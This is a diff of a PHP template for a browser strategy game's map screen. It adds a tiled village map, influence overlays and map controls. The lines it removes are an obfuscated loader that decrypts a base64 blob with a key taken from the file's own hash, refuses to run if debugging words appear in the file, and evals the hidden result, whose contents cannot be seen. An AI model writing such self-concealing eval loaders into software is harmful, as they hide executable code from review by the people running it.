@@ -1,24 +1,533 @@
-<?php
-$wwttdzdzr="d317d9c79acc28765f2be7e3e45d0dbe";
-$voenut="5d515003535807075b035254500a010706575756570350515157510000530052";
-$nqiqkin="QbiMCWoSv/jzjZj9HapzjTWkcPE9vV45yDOJHtOrEUbb6Bztkz1K5nJ6o1ThMjQ9duN+y7RPjrWft1nAGlg1QpCo2ktnk3eehWGuMyoyslV6GvAZOPD5FnssEytH+C74+cb2/IfRiz/XZ0es3NMnU1iS+so29fqC9v7flv8wUfVnApajKReD5CIhBWq4NJW/vitqUsD/6oIxWiYvr/c15+8ai2wRkOrgbdA0ySGVv0ZbCXkWrwuuuk/MQ+46l0zBoW2h/O3UeKNWlqdJ7iDGy5orNl4jL2siEY8dHANBf4AYuSij0qmc/BF/jiY0CXCLDjchijLw7znMKyYg4DYq9En0Vz8XwXVawWl1IBNG45ogNercLt2Pmi+jpCM4D+fs/opQwpAmvOLR8+dlWoZIuSLCRgj3RM7KnUVbzv+8Amfev7DUVemi0+RMtuxds2B/P/YD4BQCNp4aJQyEi+8k4yUIgL8GVFFh9yH0WJbFxlMQW9mxKLcjzTV8tJp/SMBXRLMNlmhyWIVqWUjQwZWZb5JXVnT2lsMZ3PBRsEyB078GReVdX4/12TIJKIm9gGJ8y2ommZKuHV6+y7aeCc1/bgH1Za1T6/MmaUITV4zVtgzRBM0JcQtaJ4EtSs1V1ntea0qwaGZXCwpJ+UnJ/ojfQKxRhsn+t7RU+/KJvDRKYxTVGm3vG1QKI6XhkO83eDsWY3oQF3QdJVLAYXxjjUEEBLKmKfHob9yc6DhtYd8rg/5iloiaY4+6em3QQtLYO9zE0Q6vzm3tJrOr8ABw7BQlfAR8avuoP7XHMYFbBYYhVgi88wzOw2JlOH8VrF8uvHfxL43sErWauJzBvJuRj8ie8EbADiyKpXrf6uGPNnvG75aMbXd/w3M5yaInT4xTPJgAqx/vwc10pzx2bBb6MfI8MhRLVPZCrj1ejJF2ISMqBU87FjUJQ9ANMnkWhk2hjueHkz79vRwxfFvlP0nHeFWCE5FbVHlVwrEsHE9M+RaNTLQziG3RXwxEfo1ffwUPdO6meE5q3FCht2AJqVbCNA6dsACYim5KFyzSq+QXGpfkZmfEVSH8vmamvxU1OEnGPvlxPqylOECVcQ8cF+MeSJQxZNHv5mY+bMXXbbXyrxhr9dpVwYUOpIf30PZFOg6jZGinnOk4BUOY6997oXmGZDK0uNlTsdZ9wt+mgQQ+7WbS0ktRMLoQ3JIqL6MWcs7eSzi7POmQJnQ9na6yebMUsyG8ABFPB+q1EJ+MwRZEtGb/8XGbIN4RUcbgb6dGFmnzcyi7Kt6XShNrl7rkFkTCQYgcHkuSmDz7DY161mmNpOI0kT/A7CR506xCvYy70lS2D0s1jOs6K8dXowHn42Xlwq7Hc2IvVIuoQlTamIqjTwL/VnqqRG4EHhjnNUfdTEf6IkZA4zwp7STCBp1q5SF6f71WUj2fuTJeIfW/c7sjawZwhZaqM8mFimPxFQJJW4WbYt2HphrXJZxzlDPqtvcRjBCJpQQrV8531GD4z9uWwAXT3lzJ5P4YbZngIHuEoBy/kXoLIgbhQzNnWxm9srIOlPWEIMPI1NGVCeBAC3L9IXtU4U0/mhq24TJH469MtSw6iTrhwc6BhbTfmQIg2pr/KnV3tUl/oKgQ37s0vQ3VwCXPXCF2zSd0LzhQ4SpVjbbn6DTZ/XTwrYBFmdoPL7HjjRngzmuPP7EYM0WRPlAHqqwiLg4+0BWYklucCghM8OtJZA1GcKK82B9q4ajrwaGeKAsjxQKthCNWecfMbqC21mlcacypf1nYX64WiMs9PuU9AtkrbP7DpnczVE5bFU1hZbY1V50Zq/6jdeesOBL4dRannjkKfkNON35ZkJwpU0TJunUjE+6NCLzwbDyyxDmdbghqvUQreM04roZgQPLkbHYusIcuN+ivKH2ygzAK5aPQTWy4Dl2FdYzAoHlZcrjEWKJOGQz3Dm1HGb/J21WW3/3Whkh0tE19yOrJENpOWLnFLLMDySCRG4l8bYAk3/BfxTuq9q5wydsk9zgLG5oh2jgdj9HYOedfi28RNCPBw2cADCrZ+Cp2tVGJsWj6ilpfDS4s2lKdV8DHZNGOuW2HojFh/IO5dCgpwBZrWzvWPymRTHFpTyR6bezR9uO/fCJ9l2vOQLvLTnKfcDbKrUOUuAixHW3DXM3lkHhQ8NpuHPKo+yAcw6L4H1tb0tBwUBqp4oWJVZe+/desg86qFjCiW7VUGOkCh9/Pq5FRqJGx9stDATCxKNwGMM2OiHxI/RAedwuadkC2yX0Z6KnMUuQeICTYliNkSrbK84B88wjRjwo16lmKqY79xuo6JshoU78jbNLVVetNuiXxxQVFRc7ie4gYpv+JvFP0wg6LRHEsOWWL9YF5Bwlk6tpY1mjHJHM3wqYiH2WM2ONLlv7fPJFMGa/F2+Os5sPHXJgjKN08uo3nLFW9GkYU59ZNGJ++jKTs30DN3fk8gevFS0G4eZeeOo3qyYBClxez47p5ZTyYPYM31egej+ZIw4jRxoqiiVywkauUHZ+IxWWbc8h+pi8VguzOor7MGjsYAqG7MV8VlNjEvvVN+fREAic/xFYl/iKeO1nwCG7DVH4CBif+aKBe9QoDMrRwOgTbEdTD/jrfTT/K3i6Y1FcB+OSJuzf0xzI8tJhhuJt8Eg6KyfE9/v1WvXETTYQ4zB5iIXu2sX/qYv4YnI58Mg3pwyunwnCDDXElsHddk3t847RmYIw2SUbSXfTz3beBteBk0Yf3XBx9l3LKlM+Fy1uL6GucCIZvNQYWznKvacIpVDOUB9PHB1I+lOxKJ9mcX/4LN2+rMxsMysmnPgiDTMy58IsCAtYX8o5BEcGYqK/Evs81WW5akChx6e60GChvNJpp/NTU1zqvT3dn2aALfvEIW/uT30p1WtayTk3iKGprDK59qTAp/OByNKfKx6mIQFfFmftMIt556tjtqBr8JbLOmtw5x09v5dHLtx8KT8lIItEoMtCsKmra2mGNZMrRtcUUlCgVdzzqbtYpzvzBm/ohvrpjLv2lZg4c9ILSdkVGUmK/nXSS18EsXkCweibczUN7RCUT6+QxhdZ3eBjGQTuOpQ9EfuqzJ6NnPmBpOj1rE/Rt4acLc/mmu+0g5RwLGa1ztCgCAnj39lWOikoBTo8lRrzA6tirnZ6N33dVpJk9zd2zo4fPWtgBrkROGtY0fRPl+y+HEu3lY0XcHv+K6O+Y5gSHnutAydnyzmIYy7JacKjV2aBqX21IWBEh1Qh4FS0wDGlzjN6GKXyt1XioQY+fHH4UB9c8E/U0YHpoazJ8+GBkHFDzDFtNUtr3QKY/gOj/88bmHicEya00dLeN+R19768C/69bw+LxaIa2gglIgreefWRZdri7+fg7WvgB1sbGmz/n/csdE6dA1GeOb+FAv0/JjNEuKNp9Y0wIGrAPcfHzTnivG7pyKcQ8UVXCz7brXrdXBlaXGIKhQDoYWKFqUh8HoquZD8nKUGD2uv8mwxxkRfZnHiGQEntix0klRDvrsEHLZNwAVlkp+O5a9MIdggLATliX1D2ywgqRKz2wKJllM7ekg4l/TGUpWKg5gElhQ6/UyHhgTUtTzzFbosoA0hiDgiZ7EWEoabZzZ/c7s420IrGvKfO4fVGyd2BlnATaBmyVTOAeVTNKv7nGAWk6f/EbG+gPQ83AoTZC5q6grCI+TDG/kWeSgFx9QHFXnTbcnacR6E/PRHvENN7fyGzA+U7kpFt8tnwhtv8A5aFMyKQ7sbJ8EfU1QnAznawf+08ZdzlG301FOv1InEb3iavzU6vF+5P4UqRYVKwEcdeg1//Ns7EbdTMcJtBcI1TTcO7ftfe3yrObx3dfgM3NhIE4Ek0gCWpAP9ChxUpja0z01I9ckars+3d8gPB8dc8PdfOu7fcV6itY1ADyFwjCHx4nARLwAhO6TMJ9GixgOGyvbuySn+OBhR5pZ04+qHxy/H0sIBqto27K7dy6a7UFemWhTtIB4R0qc5yNytgluit9qPgz35BhX+y/Oy6B13o/0fHEFue+k5fB4TPijQ5muxxUmzIA6prGK8AToK9zZF/sZ3IOEYEqwmxrJfPIjMNXzEHY+Ke5zAja9sow45iM64vND6rRV8ytz+9DWAvrIEaeZZHhQdJWdopQb5XkXqNBv0p0ntaKxED2S25Kx8Rh0UTKNJcT3izw5vlIBtuGxpjKOgt9vLdFVXiJWbTyQ8I1f7GZLZHmrM5XBovjG5QJ9AEOZcAh8DZPu18id+2cldCaHHCtQw/YXgzI5HfxRfd6f9MpeTjUB/ANvJvU9cdL69Ai0zvafOaPUJ0J15sfu6eW781D9fvKlI4pQtm9l+HQ9jV+nxz/2perH8+i1iAqMtmdSLIuONwD09gHFPk3niKDdGoAU2JE6JdhZJFe2exG+1nSUZ6edLLY3Jte3lw0pBoxEU21GCl/PVD0FaR0rii5fZ8sT/BnNlKGhjsYh0AP8hVYPQdKYkPV/ZwSbwahdltC+kAYYo/sorNJCn1Khmx6aQmprLS7CsTo7JT95tgfl4FRSEYV80vN6XmV6XROHaS4Au1TzpudPBB7WNl6DhJZWQPUvslBMLnj+Kxcgr0Dviv87xaJur99mN7h8/1XNpwwWOjQZQhnuE76i02F+NyBXMXYF0hj75H+ybt/2li2rI1ISmrQFjbERvrM2kYSrT4lw8O5k98pzX25IkSPeyfo2+VzRFJpslgchx/ZAZxu/71a5U/OvAja5TGc9kMmoDrIta5Z8okZMRqZ1susqSiHGQNM+7IbB/0dvMiH4+bMkv6ieR6v7IflX7a67M2AUDYuqk5nJpQ4j8UT/jv5uT6hpcM6At3Ld4VjERmzB1J3Y0akvBYRlTukSxJ86q/gaTWBeQGgGbwlucbCkxbgfEaMxiozoZbGEwzVJ4sBVJTUMqX7KV6JDQkd5ng+6c6CVFbaDMnCXHJEYxXxcTQfo9U8tfnDvPHoVLPa2HGvYGqI5PCxMWsJyDKacez25ZG/9C22yzZsteaM8E9hKyuwvCRnbrTALEOFAMyGe6OCVDaxyk2I1xiXkT6OG7CC2uyIm82rM6QXg6NbTGkrhUZDCLcIDcZcDdZbkm4mZ561uYDcI1L1VgCgGqsJC5+Guu4xj2kk/t0CLKc0aUyMxqQfQHcXwvvmRyOK0dzZ6G21OcP3wbMzNFIKearZDh83WOn0DyRL6ZvDd/8+9IFwjT9F2MPt7m+AiQpvm9nGae/fUILVCUB4FbZavNwhlrDwau7P5HMYSdOQH+CECJvn7YF9YMAtcHo4puZka62qdLw1WwFPVsu6xyFrRsL1/yGge6TirQMYwFn8YPGz4U+2TtvFY38Y8Smzg7TH1dukcgZ1vdB2/VzQ+HhA8HuUoWaWA90Hul40ISX5ArgCXXL2h1SffW4J9kHvwhS19H8S2fti6or5Qw544SuC55tekW8oVor4GhOeI8J8j7HNf0WWwFPSdISVxNjXDvd4aShVYFsyuwBceVpyXUCHouCxtRS00Q5WwExQHIHtXcbi6SRWBqOBdlzGhxqp6eBjYR+NPTHCgX/uEDr7grzTg+EzZX7cKKHk/AV0GxttuAcpHGPj2IzWYg2JKTUNMYtUPBihUm0niPKTB4glGj4GZjb/+PhESoS67HOzsnsPH7wWmi6ME3Lmgy9875BxG7SdMPlP6smJTtIsmDIcNBPtPpMOrEmHLFtWFe+ykRl0bUYoruHdTeNKCIqqz3gaAcKwQSx/GwXk5oioHfke+fUTU/ti+7t+6XO0pN5GL4jwjP6z63Tbe6k1NPaC3WhZ5D+/3l+LWCW3ctlB2nAPIQls8z9X9CAwkzIcJQ9tCxfG35rPWNsBtTZnicJZje5hWNo3Jfc0IBADt6+qYYzWYDCv2nZ891HIYRxUBZyPzdinB95L1H95tg1BCIKZ1JcTRUx6WwWlTCjJ9yw4zIvcBX6kZg1svbOGNwJjFnLqHBqqO6DRNZ2nZrqX2TMdvZ6HSHj4c+24lbbNO9aHJlUbmUZQTbSAn5CIoE7B0et5tKllZRX9y7umqSIQbIshKMUYzqPCRZI22XYYf0Cg6pG1TASWyHwN/SJNlX1qX2sylQxqCPZ0/Y823fozxU4rHA6WdwEQ4FBrLynuJvqYJgP92YDuj2BfCx52+URxHf28fAl+/Y0seWVueqhJLTVLsCKGeh9e6w6jKwxRDrJ2jGXTDIN3UQDcfyAWRxrd24CCmOC10WOvxC4N7MqXalVt1JqhX4agbKr3Vuqh808FIRbAII7fmtM6JTqlRFTh8TSTn2oR+SVS4jGsz3kFgMItcjhawtxNKhaSRhUX9vWwjWUfsDPm2r0u8ZwXXlrTIQHcR22mOc0JWb27TekSnudJNAAxoFSmXBF7VXf0Ovlt5bekeJUME9jGW8I76SLSiLgeKnxFkSQiddPbyap5QkBY8/KNKFjdyZcbNFkgP44yR/oacq3BfSOayPOPLXb9n9cTlSOZPSvfRTySoI58W/o4o3AhVkDIlmJvENSKgZtAIpTLM80+dS4=";
-$pbyiwgrgx=file_get_contents(__FILE__);
-$cubcgxwf=str_replace($nqiqkin,"",$pbyiwgrgx);
-if(strpos($cubcgxwf,"ec"."ho")!==false||strpos($cubcgxwf,"pr"."int")!==false||strpos($cubcgxwf,"var_"."dump")!==false||strpos($cubcgxwf,"file_put_"."contents")!==false||strpos($cubcgxwf,"fw"."rite")!==false){die();}
-$uumdsmeiph=str_replace(array($wwttdzdzr,$voenut),array("SP_0a4976f5","KP_1829351a"),$pbyiwgrgx);
-$dybvfdope=md5($uumdsmeiph);
-$cnzjxd=hex2bin($voenut);
-$inpogumpgl="";
-$naeprkra=strlen($dybvfdope);
-for($ovlyyj=0;$ovlyyj<$naeprkra;$ovlyyj++){
-$inpogumpgl.=chr(ord($cnzjxd[$ovlyyj])^ord($dybvfdope[$ovlyyj]));
-}
-$ophrsizded=base64_decode($nqiqkin);
-$ilahyes=strlen($ophrsizded);
-$cxfooofa="";
-$ubpnxsykk=strlen($inpogumpgl);
-for($ovlyyj=0;$ovlyyj<$ilahyes;$ovlyyj++){
-$cxfooofa.=$ophrsizded[$ovlyyj]^$inpogumpgl[$ovlyyj%$ubpnxsykk];
-}
-$pvauhyhpvr="gzun"."compress";
-eval('?>' . $pvauhyhpvr($cxfooofa) . '<?php ');
+<div class="map-screen">
+    <?php
+    $getMapGraphic = function ($graphicName) use ($map_folder) {
+        if ($map_folder === 'map_dark') {
+            $parts = explode('/', $graphicName);
+            $filename = array_pop($parts);
+            if (strpos($filename, 'n_') !== 0) {
+                $graphicName = (count($parts) > 0 ? implode('/', $parts) . '/' : '') . 'n_' . $filename;
+            }
+        }
+        return "/graphic/{$map_folder}/{$graphicName}";
+    };
+    ?>
+    <h2><?= __('screens.map.continent') ?> <span id="continent_id"><?= $mapa['kontynent'] ?></span></h2>
+
+    <!-- Leaflet.js CSS -->
+    <link rel="stylesheet" href="/css/leaflet.css" />
+    <style>
+        /* Remove default Leaflet divIcon styling */
+        .village-icon-with-ownership {
+            background: none !important;
+            border: none !important;
+        }
+    </style>
+
+    <!-- Map Mode Toggle -->
+    <!-- <div style="margin: 10px 0; text-align: right;">
+        <button id="toggle-drag-mode" class="btn" style="font-size: 11px;">
+            <span id="mode-text">🖱️ Ativar Modo Arrastável</span>
+        </button>
+    </div> -->
+
+    <!-- Static Map Container -->
+    <div id="map-static">
+        <table class="padding2">
+            <tr>
+                <td valign="top">
+                    <!-- Map table hidden when using JS map -->
+                    <table class="map_container padding2" cellspacing="0" cellpadding="0" style="display: none;">
+                        <tr>
+                            <td align="center"><a
+                                    href="game.php?village=<?= $village['id'] ?>&screen=map&x=<?= $mapa['x'] - $mapa['polowa'] ?>&y=<?= $mapa['y'] - $mapa['polowa'] ?>"><img
+                                        src="/graphic/<?= $map_folder ?>/map_nw.png"
+                                        style="z-index:1; position:relative;" alt="" /></a>
+                            </td>
+                            <td align="center"><a
+                                    href="game.php?village=<?= $village['id'] ?>&screen=map&x=<?= $mapa['x'] ?>&y=<?= $mapa['y'] - $mapa['polowa'] ?>"><img
+                                        src="/graphic/<?= $map_folder ?>/map_n.png"
+                                        style="z-index:1; position:relative;" alt="map/map_n.png" /></a></td>
+                            <td align="center"><a
+                                    href="game.php?village=<?= $village['id'] ?>&screen=map&x=<?= $mapa['x'] + $mapa['polowa'] ?>&y=<?= $mapa['y'] - $mapa['polowa'] ?>"><img
+                                        src="/graphic/<?= $map_folder ?>/map_ne.png"
+                                        style="z-index:1; position:relative;" alt="map/map_ne.png" /></a></td>
+                        </tr>
+                        <tr>
+                            <td align="center"><a
+                                    href="game.php?village=<?= $village['id'] ?>&screen=map&x=<?= $mapa['x'] - $mapa['polowa'] ?>&y=<?= $mapa['y'] ?>"><img
+                                        src="/graphic/<?= $map_folder ?>/map_w.png"
+                                        style="z-index:1; position:relative;" alt="map/map_w.png" /></a></td>
+                            <td>
+                                <table
+                                    style="border: 1px solid rgb(248, 237, 206); background-color: rgb(248, 237, 206); border-spacing: 0px; vertical-align:middle;padding: 0px 0px;"
+                                    cellpadding="0" cellspacing="0">
+                                    <?php foreach ($y_coords as $y): ?>
+                                        <tr>
+                                            <td width="20"><?= $y ?></td>
+                                            <?php foreach ($x_coords as $x): ?>
+                                                <?php $coords = $x . '|' . $y; ?>
+                                                <?php
+                                                // Check faith coverage
+                                                $has_faith = false;
+                                                foreach ($faith_circles as $fc) {
+                                                    $dist = sqrt(pow($x - $fc['x'], 2) + pow($y - $fc['y'], 2));
+                                                    if ($dist <= $fc['radius']) {
+                                                        $has_faith = true;
+                                                        break;
+                                                    }
+                                                }
+                                                
+                                                // Check watchtower coverage
+                                                $has_watchtower = false;
+                                                foreach ($watchtower_circles as $wtc) {
+                                                    $dist = sqrt(pow($x - $wtc['x'], 2) + pow($y - $wtc['y'], 2));
+                                                    if ($dist <= $wtc['radius']) {
+                                                        $has_watchtower = true;
+                                                        break;
+                                                    }
+                                                }
+                                                ?>
+
+                                                <?php if (!$mapLibrary->isVillage($coords)): ?>
+                                                    <?php if ($mapLibrary->isGhost($coords)): ?>
+                                                        <?php
+                                                        $ghost = $mapLibrary->getGhostData($coords);
+                                                        $isPending = $ghost['status'] === 'pending';
+                                                        $inviteUrl = $isPending 
+                                                            ? "game.php?village=" . $village['id'] . "&screen=profile&mode=invite" 
+                                                            : "game.php?village=" . $village['id'] . "&screen=profile&mode=invite&invite_x=" . $x . "&invite_y=" . $y;
+                                                        $inviteText = $isPending ? __('screens.map.invited_friend') : __('screens.map.invite_friend');
+                                                        $graphicFile = (isset($map_folder) && $map_folder === 'map_dark') ? 'n_ghost.png' : 'ghost.png';
+                                                        ?>
+                                                        <td id="tile_<?= $x ?>_<?= $y ?>" style="position: relative;">
+                                                            <a href="<?= $inviteUrl ?>">
+                                                                <img src="/graphic/<?= $map_folder ?>/<?= $graphicFile ?>" 
+                                                                     title="<?= $inviteText ?> (<?= $x ?>|<?= $y ?>)" 
+                                                                     alt="<?= $inviteText ?>" />
+                                                            </a>
+                                                            <?php if ($has_faith): ?>
+                                                                <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(0, 0, 255, 0.15); pointer-events: none;"></div>
+                                                            <?php endif; ?>
+                                                            <?php if ($has_watchtower): ?>
+                                                                <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(150, 255, 0, 0.2); pointer-events: none;"></div>
+                                                            <?php endif; ?>
+                                                        </td>
+                                                    <?php elseif ($mapLibrary->isDecoration($coords)): ?>
+                                                        <?php $dec = $mapLibrary->getDecoration($coords); ?>
+                                                        <td id="tile_<?= $x ?>_<?= $y ?>" style="position: relative;">
+                                                            <img src="<?= $getMapGraphic($dec['typ'] . '.png') ?>" alt="" />
+                                                            <?php if ($has_faith): ?>
+                                                                <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(0, 0, 255, 0.15); pointer-events: none;"></div>
+                                                            <?php endif; ?>
+                                                            <?php if ($has_watchtower): ?>
+                                                                <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(150, 255, 0, 0.2); pointer-events: none;"></div>
+                                                            <?php endif; ?>
+                                                        </td>
+                                                    <?php elseif ($mapLibrary->isBush($coords)): ?>
+                                                        <td id="tile_<?= $x ?>_<?= $y ?>" style="position: relative;">
+                                                            <img src="<?= $getMapGraphic($mapLibrary->getBushType($coords) . '.png') ?>"
+                                                                alt="" />
+                                                            <?php if ($has_faith): ?>
+                                                                <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(0, 0, 255, 0.15); pointer-events: none;"></div>
+                                                            <?php endif; ?>
+                                                            <?php if ($has_watchtower): ?>
+                                                                <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(150, 255, 0, 0.2); pointer-events: none;"></div>
+                                                            <?php endif; ?>
+                                                        </td>
+                                                    <?php elseif ($mapLibrary->isGrass($coords)): ?>
+                                                        <td id="tile_<?= $x ?>_<?= $y ?>" style="position: relative;">
+                                                            <img src="<?= $getMapGraphic($mapLibrary->getGrassType($coords) . '.png') ?>"
+                                                                alt="" />
+                                                            <?php if ($has_faith): ?>
+                                                                <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(0, 0, 255, 0.15); pointer-events: none;"></div>
+                                                            <?php endif; ?>
+                                                            <?php if ($has_watchtower): ?>
+                                                                <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(150, 255, 0, 0.2); pointer-events: none;"></div>
+                                                            <?php endif; ?>
+                                                        </td>
+                                                    <?php else: ?>
+                                                        <td id="tile_<?= $x ?>_<?= $y ?>" style="position: relative;">
+                                                            <img src="<?= $getMapGraphic('gras1.png') ?>" alt="" />
+                                                            <?php if ($has_faith): ?>
+                                                                <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(0, 0, 255, 0.15); pointer-events: none;"></div>
+                                                            <?php endif; ?>
+                                                            <?php if ($has_watchtower): ?>
+                                                                <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(150, 255, 0, 0.2); pointer-events: none;"></div>
+                                                            <?php endif; ?>
+                                                        </td>
+                                                    <?php endif; ?>
+                                                <?php else: ?>
+                                                    <td id="tile_<?= $x ?>_<?= $y ?>"
+                                                        style="<?= $mapLibrary->getVillageColorStyle($coords, $village['id'], $user['id'], $user['ally'] ?? -1) ?> position: relative;">
+                                                        <div style="width: 53px; height: 38px;">
+                                                            <a id="map"
+                                                                href="game.php?village=<?= $village['id'] ?>&screen=info_village&id=<?= $mapLibrary->getVillageId($coords) ?>">
+                                                                <img src="<?= $getMapGraphic($mapLibrary->getVillageGraphic($coords)) ?>"
+                                                                    title="<?= $mapLibrary->getVillageName($coords) ?> (<?= $x ?>|<?= $y ?>) K<?= $mapLibrary->getContinent($coords) ?> - <?= $mapLibrary->getPlayerInfo($coords) ?> - <?= $mapLibrary->getAllyInfo($coords) ?>"
+                                                                    alt="" />
+                                                                <?= $mapLibrary->getVillageStatus($coords, $user['id'], $user['ally'] ?? -1) ?>
+                                                                <?php if ($mapLibrary->getVillageId($coords) == $village['id']): ?>
+                                                                    <img src="/graphic/<?= $map_folder ?>/home.png" style="position: absolute; top: -50%; left: -25%; width: 150%; height: 200%; z-index: 5; pointer-events: none;" alt="" />
+                                                                <?php endif; ?>
+                                                                <?php if ($has_faith): ?>
+                                                                    <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(0, 0, 255, 0.15); pointer-events: none;"></div>
+                                                                <?php endif; ?>
+                                                                <?php if ($has_watchtower): ?>
+                                                                    <div style="position:absolute; top:0; left:0; width:53px; height:38px; background-color: rgba(150, 255, 0, 0.2); pointer-events: none;"></div>
+                                                                <?php endif; ?>
+                                                            </a>
+                                                        </div>
+                                                    </td>
+                                                <?php endif; ?>
+                                            <?php endforeach; ?>
+                                        </tr>
+                                    <?php endforeach; ?>
+
+                                    <tr>
+                                        <td height="20"></td>
+                                        <?php foreach ($x_coords as $x): ?>
+                                            <td><?= $x ?></td>
+                                        <?php endforeach; ?>
+                                    </tr>
+                                </table>
+                            </td>
+                            <td align="center"><a
+                                    href="game.php?village=<?= $village['id'] ?>&screen=map&x=<?= $mapa['x'] + $mapa['polowa'] ?>&y=<?= $mapa['y'] ?>"><img
+                                        src="/graphic/<?= $map_folder ?>/map_e.png"
+                                        style="z-index:1; position:relative;" alt="map/map_e.png" /></a></td>
+                        </tr>
+                        <tr>
+                            <td align="center"><a
+                                    href="game.php?village=<?= $village['id'] ?>&screen=map&x=<?= $mapa['x'] - $mapa['polowa'] ?>&y=<?= $mapa['y'] + $mapa['polowa'] ?>"><img
+                                        src="/graphic/<?= $map_folder ?>/map_sw.png"
+                                        style="z-index:1; position:relative;" alt="map/map_sw.png" /></a></td>
+                            <td align="center"><a
+                                    href="game.php?village=<?= $village['id'] ?>&screen=map&x=<?= $mapa['x'] ?>&y=<?= $mapa['y'] + $mapa['polowa'] ?>"><img
+                                        src="/graphic/<?= $map_folder ?>/map_s.png"
+                                        style="z-index:1; position:relative;" alt="map/map_s.png" /></a></td>
+                            <td align="center"><a
+                                    href="game.php?village=<?= $village['id'] ?>&screen=map&x=<?= $mapa['x'] + $mapa['polowa'] ?>&y=<?= $mapa['y'] + $mapa['polowa'] ?>"><img
+                                        src="/graphic/<?= $map_folder ?>/map_se.png"
+                                        style="z-index:1; position:relative;" alt="map/map_se.png" /></a></td>
+                        </tr>
+                    </table>
+
+                    <!-- JavaScript Map System (replaces static map table) -->
+                    <div id="js-map-container" style="width: 795px; height: 570px;"></div>
+
+                    <table class="vis" width="100%" style="margin-top: 8px;">
+                        <tr>
+                            <th><b><?= __('screens.map.display_options') ?: 'Opções de Exibição' ?></b></th>
+                        </tr>
+                        <?php if (!empty($config['church'])): ?>
+                            <tr>
+                                <td style="padding: 5px;">
+                                    <label for="cb-map-faith"
+                                        style="cursor: pointer; display: flex; align-items: center; gap: 5px;">
+                                        <input type="checkbox" id="cb-map-faith"
+                                            onchange="if(window.jsMapSystem) window.jsMapSystem.toggleFaithCircles(this.checked);" />
+                                        <?= __('screens.map.show_church_influence') ?: 'Mostrar raio de influência da Igreja' ?>
+                                    </label>
+                                </td>
+                            </tr>
+                        <?php endif; ?>
+                        <?php if (!empty($config['watchtower'])): ?>
+                            <tr>
+                                <td style="padding: 5px;">
+                                    <label for="cb-map-watchtower"
+                                        style="cursor: pointer; display: flex; align-items: center; gap: 5px;">
+                                        <input type="checkbox" id="cb-map-watchtower"
+                                            onchange="if(window.jsMapSystem) window.jsMapSystem.toggleWatchtowerCircles(this.checked);" />
+                                        <?= __('screens.map.show_watchtower_influence') ?: 'Mostrar raio de influência da Torre de Vigia' ?>
+                                    </label>
+                                </td>
+                            </tr>
+                        <?php endif; ?>
+                    </table>
+                </td>
+                <td valign="top" style="padding-left: 10px;">
+                    <table class="vis padding2" width="100%">
+                        <tr>
+                            <th><b><?= __('screens.map.center_map') ?></b></th>
+                        </tr>
+                        <tr>
+                            <td>
+                                <form action="game.php?village=<?= $village['id'] ?>&screen=map" method="get">
+                                    <input type="hidden" name="village" value="<?= $village['id'] ?>" />
+                                    <input type="hidden" name="screen" value="map" />
+                                    <table>
+                                        <tr>
+                                            <td>x: <input type="text" name="x" value="<?= $mapa['x'] ?>" size="5" /> y:
+                                                <input type="text" name="y" value="<?= $mapa['y'] ?>" size="5" />
+                                            </td>
+                                            <td><input class="btn btn-defult" type="submit"
+                                                    value="<?= __('screens.map.map_coord_btn') ?>"
+                                                    style="font-size: 10pt;" /></td>
+                                        </tr>
+                                    </table>
+                                </form>
+                            </td>
+                        </tr>
+                    </table>
+
+                    <br>
+
+                    <!-- World Minimap -->
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th><b><?= __('screens.map.world_map') ?></b></th>
+                        </tr>
+                        <tr>
+                            <td align="center">
+                                <div id="world-minimap" style="padding: 10px;"></div>
+                            </td>
+                        </tr>
+                    </table>
+
+                    <br>
+
+                    <table class="vis padding2" width="100%">
+                        <tr>
+                            <th><b><?= __('screens.map.map_size') ?></b></th>
+                        </tr>
+                        <tr>
+                            <td>
+                                <form
+                                    action="game.php?village=<?= $village['id'] ?>&screen=map&action=zapisz_rozmiar_mapy"
+                                    method="post">
+                                    <table class="vis" width="100%">
+                                        <tr>
+                                            <td width="50%">
+                                                <center>
+                                                    <select name="map_size" style="width: 80%;">
+                                                        <option label="7x7" value="7" <?= ($mapSize == 7) ? 'selected' : '' ?>>
+                                                            7x7</option>
+                                                        <option label="9x9" value="9" <?= ($mapSize == 9) ? 'selected' : '' ?>>
+                                                            9x9</option>
+                                                        <option label="11x11" value="11" <?= ($mapSize == 11) ? 'selected' : '' ?>>11x11</option>
+                                                        <option label="13x13" value="13" <?= ($mapSize == 13) ? 'selected' : '' ?>>13x13</option>
+                                                        <option label="15x15" value="15" <?= ($mapSize == 15) ? 'selected' : '' ?>>15x15</option>
+                                                        <option label="19x19" value="19" <?= ($mapSize == 19) ? 'selected' : '' ?>>19x19</option>
+                                                        <option label="23x23" value="23" <?= ($mapSize == 23) ? 'selected' : '' ?>>23x23</option>
+                                                        <option label="31x31" value="31" <?= ($mapSize == 31) ? 'selected' : '' ?>>31x31</option>
+                                                    </select>
+                                                </center>
+                                            </td>
+                                            <td width="50%">
+                                                <center>
+                                                    <input class="btn btn-defult" type="submit"
+                                                        value="<?= __('screens.map.map_size_btn') ?>"
+                                                        style="font-size: 10pt; width: 50%;" />
+                                                </center>
+                                            </td>
+                                        </tr>
+                                    </table>
+                                </form>
+                            </td>
+                        </tr>
+                    </table>
+
+                    <br>
+
+                    <table
+                        style="border: 1px solid rgb(140, 95, 13); background-color: rgb(244, 228, 188); margin-left: 0px; border-collapse: separate; text-align: left; width: auto;"
+                        class="padding2" width="1">
+                        <tbody>
+                            <tr class="nowrap">
+                                <td class="small" valign="top"><?= __('screens.map.legend_default') ?></td>
+                                <td
+                                    style="padding: 0px; width: 15px; min-width: 15px; height: 15px; background-color: rgb(255, 255, 255);">&nbsp;
+                                </td>
+                                <td class="small" style="white-space: normal;"><?= __('screens.map.legend_selected') ?>
+                                </td>
+                                <td
+                                    style="padding: 0px; width: 15px; min-width: 15px; height: 15px; background-color: rgb(240, 200, 0);">&nbsp;
+                                </td>
